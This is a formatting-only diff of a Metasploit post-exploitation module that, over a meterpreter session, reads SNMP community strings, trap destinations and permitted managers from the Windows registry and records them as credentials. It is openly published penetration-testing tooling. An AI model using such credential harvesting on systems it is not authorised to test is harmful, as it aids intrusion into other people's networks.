@@ -3,20 +3,22 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather SNMP Settings Enumeration (Registry)',
-        'Description'   => %q{ This module will enumerate the SNMP service configuration },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>', 'Tebo <tebo[at]attackresearch.com>'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather SNMP Settings Enumeration (Registry)',
+        'Description' => %q{ This module will enumerate the SNMP service configuration },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>', 'Tebo <tebo[at]attackresearch.com>'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
 
   # Run Method called when command run is issued
@@ -45,22 +47,22 @@ class MetasploitModule < Msf::Post
   def community_strings
     comm_str = []
     tbl = Rex::Text::Table.new(
-      'Header'  => "Community Strings",
-      'Indent'  => 1,
+      'Header' => "Community Strings",
+      'Indent' => 1,
       'Columns' =>
       [
         "Name",
         "Type"
-      ])
+      ]
+    )
     print_status("Enumerating community strings")
     key = "HKLM\\System\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities"
     comm_str = registry_enumvals(key)
     if not comm_str.nil? and not comm_str.empty?
       comm_str.each do |c|
-
         # comm_type is for human display, access_type is passed to the credential
         # code using labels consistent with the SNMP login scanner
-        case registry_getvaldata(key,c)
+        case registry_getvaldata(key, c)
         when 4
           comm_type = 'READ ONLY'
           access_type = 'read-only'
@@ -79,7 +81,7 @@ class MetasploitModule < Msf::Post
         end
 
         # Save data to table
-        tbl << [c,comm_type]
+        tbl << [c, comm_type]
 
         register_creds(session.session_host, 161, '', c, 'snmp', access_type)
       end
@@ -109,9 +111,9 @@ class MetasploitModule < Msf::Post
       trap_hosts.each do |c|
         print_status("Community Name: #{c}")
 
-        t_comm_key = key+"\\"+c
+        t_comm_key = key + "\\" + c
         registry_enumvals(t_comm_key).each do |t|
-          trap_dest = registry_getvaldata(t_comm_key,t)
+          trap_dest = registry_getvaldata(t_comm_key, t)
           print_status("\tDestination: #{trap_dest}")
           register_creds(trap_dest, 162, '', c, 'snmptrap', 'trap')
         end
@@ -129,7 +131,7 @@ class MetasploitModule < Msf::Post
     if not managers.nil? and not managers.empty?
       print_status("Community Strings can be accessed from:")
       managers.each do |m|
-        print_status("\t#{registry_getvaldata(key,m)}")
+        print_status("\t#{registry_getvaldata(key, m)}")
       end
 
     else
